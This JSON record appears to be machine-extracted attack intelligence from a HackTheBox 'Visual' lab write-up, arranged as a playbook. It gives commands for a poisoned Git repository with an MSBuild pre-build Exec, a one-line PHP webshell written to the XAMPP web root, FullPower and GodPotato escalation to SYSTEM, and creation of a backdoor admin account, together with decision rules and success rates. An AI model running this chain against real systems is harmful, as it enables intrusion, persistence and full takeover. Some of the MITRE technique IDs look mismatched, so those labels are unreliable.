@@ -1,0 +1,975 @@
+{
+  "writeup_id": "Htb_Visual",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_xampp_visual_studio_build_injection",
+    "primary_services": [
+      "http",
+      "apache",
+      "php"
+    ],
+    "port_signature": "80",
+    "service_combination": "apache+php+xampp",
+    "os_family": "windows_server",
+    "environment_type": "web_application",
+    "entry_vector": "build_process_injection",
+    "privilege_path": "web_service_to_system",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "visual_studio_build_service",
+      "git_repository_processing",
+      "xampp_web_stack",
+      "pre_build_action_execution"
+    ],
+    "environmental_clues": [
+      "apache_2_4_56_win64",
+      "php_8_1_17",
+      "openssl_1_1_1t",
+      "uploads_directory_structure",
+      "visual_studio_project_compilation"
+    ],
+    "similar_scenarios": [
+      "jenkins_build_injection",
+      "ci_cd_pipeline_abuse"
+    ],
+    "unique_aspects": [
+      "gitea_server_hosting_requirement",
+      "sln_file_processing",
+      "fullpower_seimpersonate_recovery",
+      "godpotato_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Git Repository Poisoning",
+        "success_reason": "Application blindly cloned and built from user-controlled Git repositories",
+        "prerequisite_indicators": [
+          "git_service_available",
+          "automated_build_process",
+          "user_controlled_repository_urls"
+        ],
+        "recognition_patterns": [
+          "git clone requests in logs",
+          "build automation mentioned",
+          "repository URL input fields",
+          "Visual Studio/MSBuild references"
+        ],
+        "failure_modes": [
+          "repository_url_validation",
+          "sandboxed_build_environment",
+          "no_network_access_from_build"
+        ],
+        "environmental_factors": [
+          "xampp_default_configuration",
+          "unsandboxed_build_process",
+          "network_accessible_build_server"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "MSBuild Pre-Build Events",
+        "success_reason": "MSBuild executed pre-build commands without validation",
+        "prerequisite_indicators": [
+          "msbuild_available",
+          "project_files_processed",
+          "command_execution_allowed"
+        ],
+        "recognition_patterns": [
+          "Visual Studio project compilation",
+          ".sln/.csproj file processing",
+          "build automation systems",
+          "pre-build event support"
+        ],
+        "failure_modes": [
+          "restricted_build_environment",
+          "command_execution_disabled",
+          "project_file_validation"
+        ],
+        "environmental_factors": [
+          "default_msbuild_configuration",
+          "unrestricted_command_execution",
+          "developer_focused_environment"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "FullPower SeImpersonate Recovery",
+        "success_reason": "Service account missing SeImpersonate but FullPower could restore it",
+        "prerequisite_indicators": [
+          "service_account_context",
+          "missing_seimpersonate_privilege",
+          "fullpower_executable_available"
+        ],
+        "recognition_patterns": [
+          "whoami /priv shows missing SeImpersonate",
+          "service account without standard privileges",
+          "restricted service configuration"
+        ],
+        "failure_modes": [
+          "fullpower_blocked_by_av",
+          "insufficient_base_privileges",
+          "modern_privilege_restrictions"
+        ],
+        "environmental_factors": [
+          "legacy_service_configuration",
+          "insufficient_privilege_hardening",
+          "default_xampp_service_setup"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Git clone with service=git-upload-pack",
+        "discovery_method": "Network traffic analysis during repository submission",
+        "why_critical": "Revealed automated Git repository cloning for build process",
+        "how_to_recognize": [
+          "git user-agent in requests",
+          "git-upload-pack service parameter",
+          "automated repository fetching behavior"
+        ],
+        "follow_up_actions": [
+          "setup_malicious_git_server",
+          "create_poisoned_visual_studio_project",
+          "implement_pre_build_command_execution"
+        ]
+      },
+      {
+        "discovery": "XAMPP web root access",
+        "discovery_method": "Initial shell with write access to web directory",
+        "why_critical": "Enabled persistent webshell deployment for stable access",
+        "how_to_recognize": [
+          "apache/xampp directory structure",
+          "write permissions to web root",
+          "php execution capability"
+        ],
+        "follow_up_actions": [
+          "deploy_webshell_to_htdocs",
+          "establish_persistent_access",
+          "enumerate_service_privileges"
+        ]
+      },
+      {
+        "discovery": "Service account without SeImpersonate",
+        "discovery_method": "whoami /priv enumeration",
+        "why_critical": "Unusual configuration that required FullPower technique for privilege escalation",
+        "how_to_recognize": [
+          "service context without standard privileges",
+          "missing SeImpersonate in privilege list",
+          "restricted service account configuration"
+        ],
+        "follow_up_actions": [
+          "download_fullpower_executable",
+          "restore_seimpersonate_privilege",
+          "use_godpotato_for_system"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "initial_command_execution",
+        "escalation_method": "MSBuild_PreBuild_to_WebShell",
+        "why_possible": "Pre-build events executed with web service privileges and write access to web root",
+        "recognition_signs": [
+          "msbuild_processing_user_projects",
+          "web_service_file_system_access",
+          "php_execution_environment"
+        ],
+        "exploitation_path": "Malicious Git Repo → Pre-Build Command → WebShell Deployment"
+      },
+      {
+        "privilege_level": "web_service_account",
+        "escalation_method": "FullPower_to_System",
+        "why_possible": "Service account could recover SeImpersonate privilege through FullPower technique",
+        "recognition_signs": [
+          "service_account_without_seimpersonate",
+          "fullpower_technique_applicable",
+          "godpotato_escalation_possible"
+        ],
+        "exploitation_path": "FullPower.exe → Restore SeImpersonate → GodPotato → SYSTEM"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Single HTTP port (80) open on Windows host running Apache/PHP",
+        "decision": "Focus on web application enumeration and exploitation",
+        "reasoning": "Limited attack surface suggests web app is primary entry point",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "port_scan_udp",
+            "when": "if web exploitation fails"
+          },
+          {
+            "option": "subdomain_enumeration",
+            "when": "if additional services suspected"
+          }
+        ],
+        "success_indicators": [
+          "web_application_identified",
+          "functionality_understood",
+          "input_vectors_found"
+        ],
+        "next_decision": "analyze_web_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Web app compiles Visual Studio projects from Git URLs",
+        "decision": "Test for Git repository access and build process injection",
+        "reasoning": "Build processes often execute code and have elevated privileges",
+        "confidence": 0.85,
+        "prerequisites": [
+          "git_url_input_confirmed",
+          "build_process_identified"
+        ],
+        "success_indicators": [
+          "git_connection_established",
+          "build_process_triggered"
+        ],
+        "failure_fallbacks": [
+          "directory_traversal",
+          "file_upload_bypass",
+          "php_code_injection"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Target connects to external Git server with specific user-agent",
+        "decision": "Host malicious Git repository with Visual Studio project containing pre-build commands",
+        "reasoning": "Pre-build events execute before compilation with build service privileges",
+        "confidence": 0.95,
+        "prerequisites": [
+          "git_server_accessible",
+          "visual_studio_project_structure_known"
+        ],
+        "success_indicators": [
+          "repository_cloned",
+          "build_process_started",
+          "pre_build_executed"
+        ],
+        "failure_fallbacks": [
+          "post_build_events",
+          "msbuild_inline_tasks",
+          "project_file_injection"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Initial shell obtained as service account without SeImpersonate",
+        "decision": "Use FullPower to restore missing privileges then escalate",
+        "reasoning": "Service accounts typically have SeImpersonate but may be stripped",
+        "confidence": 0.8,
+        "prerequisites": [
+          "service_account_confirmed",
+          "privilege_enumeration_complete"
+        ],
+        "success_indicators": [
+          "seimpersonate_restored",
+          "potato_attack_possible"
+        ],
+        "failure_fallbacks": [
+          "kernel_exploits",
+          "service_misconfigurations",
+          "scheduled_tasks"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_git_connection_succeeds": {
+        "action": "setup_malicious_repository",
+        "tools": [
+          "gitea",
+          "docker",
+          "visual_studio_project_template"
+        ],
+        "next_phase": "craft_pre_build_payload"
+      },
+      "if_build_process_executes": {
+        "action": "establish_persistent_access",
+        "alternatives": [
+          "webshell_deployment",
+          "reverse_shell",
+          "scheduled_task"
+        ],
+        "decision_criteria": "based_on_execution_context_and_permissions"
+      },
+      "if_service_account_obtained": {
+        "action": "privilege_escalation_enumeration",
+        "purpose": "identify_escalation_vectors",
+        "tools": [
+          "whoami_priv",
+          "fullpower",
+          "godpotato"
+        ]
+      },
+      "if_seimpersonate_missing": {
+        "action": "restore_privileges_then_escalate",
+        "tools": [
+          "fullpower",
+          "godpotato"
+        ],
+        "reasoning": "common_pattern_for_service_accounts"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_build_process_injection_on_ci_cd_systems",
+        "reasoning": "build_processes_execute_with_elevated_privileges",
+        "applicability": "continuous_integration_or_build_services"
+      },
+      {
+        "rule": "check_for_missing_service_privileges_before_potato_attacks",
+        "reasoning": "modern_systems_may_strip_seimpersonate_from_services",
+        "applicability": "service_account_shells"
+      },
+      {
+        "rule": "use_pre_build_events_over_post_build_for_immediate_execution",
+        "reasoning": "pre_build_executes_before_compilation_failures",
+        "applicability": "visual_studio_project_injection"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Visual Studio Build Process Abuse",
+        "mitre_id": "T1055.001",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "visual_studio_build_service",
+          "git_repository_input_accepted",
+          "msbuild_or_dotnet_build_available",
+          "prebuild_events_enabled"
+        ],
+        "success_indicators": [
+          "build_process_initiated",
+          "prebuild_event_execution",
+          "command_execution_in_build_context"
+        ],
+        "incompatible_with": [
+          "prebuild_events_disabled",
+          "sandboxed_build_environment",
+          "git_access_blocked"
+        ],
+        "confidence_boosters": [
+          "visual_studio_branding_present",
+          "sln_file_references",
+          "msbuild_error_messages",
+          "dotnet_framework_indicators"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Web Shell Upload via Build Process",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_root_write_access",
+          "php_execution_enabled",
+          "xampp_or_similar_stack",
+          "build_process_file_system_access"
+        ],
+        "success_indicators": [
+          "file_written_to_web_root",
+          "web_shell_accessible_via_http",
+          "php_code_execution_confirmed"
+        ],
+        "incompatible_with": [
+          "web_root_write_protected",
+          "php_disabled",
+          "strict_file_upload_filtering"
+        ],
+        "confidence_boosters": [
+          "xampp_default_configuration",
+          "apache_php_stack_detected",
+          "uploads_directory_writable"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "SeImpersonate Recovery with FullPower",
+        "mitre_id": "T1134.001",
+        "required_services": [
+          "windows_service"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "service_account_context",
+          "missing_seimpersonate_privilege",
+          "fullpower_executable_uploadable",
+          "service_restart_capability"
+        ],
+        "success_indicators": [
+          "seimpersonate_privilege_restored",
+          "service_context_maintained",
+          "privilege_escalation_possible"
+        ],
+        "incompatible_with": [
+          "seimpersonate_already_present",
+          "service_hardening_enabled",
+          "privilege_recovery_blocked"
+        ],
+        "confidence_boosters": [
+          "local_service_account_detected",
+          "missing_standard_service_privileges",
+          "windows_service_context_confirmed"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "GodPotato Privilege Escalation",
+        "mitre_id": "T1134.004",
+        "required_services": [
+          "windows_service"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "seimpersonate_privilege_available",
+          "com_object_access",
+          "godpotato_executable_uploadable",
+          "system_context_achievable"
+        ],
+        "success_indicators": [
+          "system_level_command_execution",
+          "nt_authority_system_context",
+          "administrative_privileges_confirmed"
+        ],
+        "incompatible_with": [
+          "seimpersonate_privilege_missing",
+          "com_objects_restricted",
+          "potato_attacks_patched"
+        ],
+        "confidence_boosters": [
+          "seimpersonate_privilege_confirmed",
+          "service_account_context",
+          "vulnerable_windows_version"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-10 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "visual_studio_build_service": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Visual Studio",
+          "msbuild",
+          "dotnet",
+          ".sln"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "xampp_stack": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "apache",
+          "php"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "PHP",
+          "OpenSSL",
+          "Win64"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_service_context": {
+        "port_indicators": [],
+        "service_indicators": [
+          "windows_service"
+        ],
+        "banner_indicators": [
+          "LOCAL SERVICE",
+          "NETWORK SERVICE"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "visual_studio_build_abuse",
+          "when": "visual_studio_build_service_detected",
+          "reason": "direct_code_execution_via_prebuild_events"
+        },
+        {
+          "attack": "godpotato_privilege_escalation",
+          "when": "seimpersonate_privilege_available",
+          "reason": "reliable_system_level_escalation"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "web_shell_upload",
+          "when": "web_root_write_access_available",
+          "reason": "persistent_access_establishment"
+        },
+        {
+          "attack": "fullpower_privilege_recovery",
+          "when": "service_account_missing_privileges",
+          "reason": "enables_subsequent_escalation_techniques"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Visual Studio Build Process Abuse",
+        "mitre_id": "T1055.001",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Gitea",
+            "command_template": "docker run -p 3000:3000 gitea/gitea",
+            "actual_command": "docker run -p 3000:3000 gitea/gitea",
+            "output_pattern": "Starting new Web server: tcp:0.0.0.0:3000",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "Visual Studio",
+            "command_template": "dotnet new console -n {project_name}",
+            "actual_command": "dotnet new console -n Hello0xdf",
+            "success_factors": [
+              "net6.0_framework",
+              "valid_csproj_file"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "git_service_accessible",
+          "visual_studio_build_service_available",
+          "network_connectivity_to_attacker_git_server"
+        ],
+        "success_indicators": [
+          "git_clone_request_received",
+          "build_process_initiated",
+          "pre_build_actions_executed"
+        ],
+        "common_failures": [
+          "network_connectivity_issues",
+          "invalid_project_structure",
+          "unsupported_dotnet_version"
+        ],
+        "follow_up_techniques": [
+          "webshell_deployment",
+          "privilege_escalation",
+          "service_enumeration"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Pre-Build Action Code Execution",
+        "mitre_id": "T1059.001",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "MSBuild",
+            "command_template": "<Target Name=\"PreBuild\" BeforeTargets=\"PreBuildEvent\"><Exec Command=\"{command}\" /></Target>",
+            "actual_command": "<Target Name=\"PreBuild\" BeforeTargets=\"PreBuildEvent\"><Exec Command=\"powershell -c command\" /></Target>",
+            "output_pattern": "Command execution during build",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "msbuild_available",
+          "valid_csproj_file",
+          "build_process_triggered"
+        ],
+        "success_indicators": [
+          "command_executed_during_build",
+          "reverse_shell_connection",
+          "file_system_access_achieved"
+        ],
+        "common_failures": [
+          "command_syntax_errors",
+          "network_filtering",
+          "insufficient_privileges"
+        ],
+        "follow_up_techniques": [
+          "webshell_deployment",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "XAMPP Webshell Deployment",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "persistence",
+        "tools_used": [
+          {
+            "name": "PHP Webshell",
+            "command_template": "echo '<?php system($_GET[\"cmd\"]); ?>' > {webroot}/shell.php",
+            "actual_command": "echo '<?php system($_GET[\"cmd\"]); ?>' > C:\\xampp\\htdocs\\shell.php",
+            "output_pattern": "Webshell accessible via HTTP",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "write_access_to_webroot",
+          "xampp_service_running",
+          "php_execution_enabled"
+        ],
+        "success_indicators": [
+          "webshell_file_created",
+          "http_access_to_shell",
+          "command_execution_via_web"
+        ],
+        "common_failures": [
+          "insufficient_write_permissions",
+          "antivirus_detection",
+          "web_server_not_running"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "credential_harvesting",
+          "persistence_mechanisms"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "FullPower SeImpersonate Recovery",
+        "mitre_id": "T1134.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "FullPower.exe",
+            "command_template": "FullPower.exe -c \"{command}\"",
+            "actual_command": "FullPower.exe -c \"powershell -ep bypass\"",
+            "output_pattern": "SeImpersonatePrivilege enabled",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "service_account_context",
+          "missing_seimpersonate_privilege",
+          "fullpower_executable_available"
+        ],
+        "success_indicators": [
+          "seimpersonate_privilege_restored",
+          "new_process_with_privileges",
+          "token_manipulation_possible"
+        ],
+        "common_failures": [
+          "insufficient_base_privileges",
+          "antivirus_detection",
+          "execution_policy_restrictions"
+        ],
+        "follow_up_techniques": [
+          "godpotato_exploitation",
+          "token_impersonation",
+          "system_shell_acquisition"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "GodPotato Privilege Escalation",
+        "mitre_id": "T1134.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "GodPotato.exe",
+            "command_template": "GodPotato.exe -cmd \"{command}\"",
+            "actual_command": "GodPotato.exe -cmd \"cmd /c whoami\"",
+            "output_pattern": "nt authority\\system",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "seimpersonate_privilege",
+          "service_account_context",
+          "godpotato_executable_available"
+        ],
+        "success_indicators": [
+          "system_level_command_execution",
+          "nt_authority_system_context",
+          "administrative_privileges_gained"
+        ],
+        "common_failures": [
+          "missing_seimpersonate_privilege",
+          "antivirus_detection",
+          "patched_system"
+        ],
+        "follow_up_techniques": [
+          "credential_dumping",
+          "persistence_establishment",
+          "lateral_movement"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Gitea",
+        "use_case": "malicious_git_repository_hosting",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "git_based_attacks"
+        ],
+        "alternatives": [
+          "github",
+          "gitlab",
+          "custom_git_server"
+        ],
+        "best_practices": [
+          "use_docker_for_quick_deployment",
+          "configure_public_repositories",
+          "ensure_network_accessibility"
+        ]
+      },
+      {
+        "tool": "FullPower",
+        "use_case": "seimpersonate_privilege_recovery",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "service_account_privilege_escalation"
+        ],
+        "alternatives": [
+          "manual_token_manipulation",
+          "other_potato_variants"
+        ],
+        "best_practices": [
+          "verify_current_privileges_first",
+          "use_with_godpotato_for_full_escalation",
+          "test_in_isolated_environment"
+        ]
+      },
+      {
+        "tool": "GodPotato",
+        "use_case": "windows_privilege_escalation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_privilege_escalation"
+        ],
+        "alternatives": [
+          "roguepotato",
+          "juicypotato",
+          "printspoofer"
+        ],
+        "best_practices": [
+          "ensure_seimpersonate_privilege_available",
+          "test_command_execution_first",
+          "use_for_system_level_access"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "visual_studio_build_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "docker run -p 3000:3000 gitea/gitea",
+            "purpose": "Start Gitea server for hosting malicious repository",
+            "expected_output": "Gitea web server running on port 3000"
+          },
+          {
+            "step": 2,
+            "command": "Create malicious .csproj with pre-build action",
+            "purpose": "Embed command execution in build process",
+            "expected_output": "Project file with embedded payload"
+          },
+          {
+            "step": 3,
+            "command": "Submit git repository URL to Visual application",
+            "purpose": "Trigger build process with malicious project",
+            "expected_output": "Build initiated and pre-build commands executed"
+          },
+          {
+            "step": 4,
+            "command": "Deploy webshell to XAMPP webroot",
+            "purpose": "Establish persistent web-based access",
+            "expected_output": "Webshell accessible via HTTP"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "20-40 minutes"
+      },
+      {
+        "sequence_name": "service_to_system_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "FullPower.exe -c \"powershell -ep bypass\"",
+            "purpose": "Recover SeImpersonate privilege",
+            "expected_output": "PowerShell session with SeImpersonate"
+          },
+          {
+            "step": 2,
+            "command": "GodPotato.exe -cmd \"cmd /c whoami\"",
+            "purpose": "Test system-level command execution",
+            "expected_output": "nt authority\\system"
+          },
+          {
+            "step": 3,
+            "command": "GodPotato.exe -cmd \"cmd /c net user admin password123 /add\"",
+            "purpose": "Create administrative user account",
+            "expected_output": "User account created successfully"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Visual",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2023-09-30",
+      "author": "IsThisEnox",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "build_process_abuse",
+        "git_repository_poisoning"
+      ],
+      "key_vulnerabilities": [
+        "unsafe_build_execution",
+        "service_misconfiguration",
+        "missing_privileges"
+      ],
+      "environment_type": "web_development_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "ci_cd_attacks",
+        "build_system_exploitation",
+        "privilege_recovery"
+      ],
+      "prerequisite_knowledge": [
+        "visual_studio_projects",
+        "git_basics",
+        "windows_services"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "build_system_abuse",
+        "privilege_escalation",
+        "service_exploitation"
+      ],
+      "attack_types": [
+        "code_execution",
+        "privilege_escalation",
+        "supply_chain_attack"
+      ],
+      "defensive_lessons": [
+        "secure_build_processes",
+        "input_validation",
+        "service_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Devvortex",
+        "Builder",
+        "Craft"
+      ],
+      "similarity_reasons": [
+        "development_environment",
+        "build_process_exploitation",
+        "web_application_focus"
+      ],
+      "unique_aspects": [
+        "visual_studio_prebuild_actions",
+        "gitea_server_setup",
+        "fullpower_privilege_recovery"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "container_setup_required",
+        "privilege_recovery_techniques"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T11:39:48.392403",
+    "original_file": "0xdf_writeups/Htb Visual.md",
+    "content_length": 48402,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
